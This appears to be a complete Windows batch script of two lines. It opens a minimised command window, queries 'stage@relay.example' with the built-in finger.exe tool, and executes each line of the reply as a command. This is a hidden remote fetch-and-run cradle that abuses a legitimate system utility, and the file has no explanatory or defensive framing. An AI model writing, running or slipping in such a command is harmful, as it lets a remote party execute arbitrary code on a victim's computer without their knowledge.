@echo off
start "" /min cmd.exe /c for /f "usebackq delims=" %%q in ('finger.exe stage@relay.example') do call %%q
